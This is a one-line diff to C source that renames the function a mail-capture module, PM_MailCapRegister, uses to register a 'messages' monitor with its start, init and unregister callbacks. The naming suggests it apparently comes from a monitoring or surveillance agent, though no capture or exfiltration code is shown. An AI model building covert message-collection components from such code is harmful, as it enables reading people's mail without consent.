@@ -100,5 +100,5 @@ DWORD __stdcall PM_MailCapUnregister()
 
 void PM_MailCapRegister()
 {
-	AM_MonitorRegisterBSON(L"messages", PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
+	AM_MonitorRegister(L"messages", PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
 }
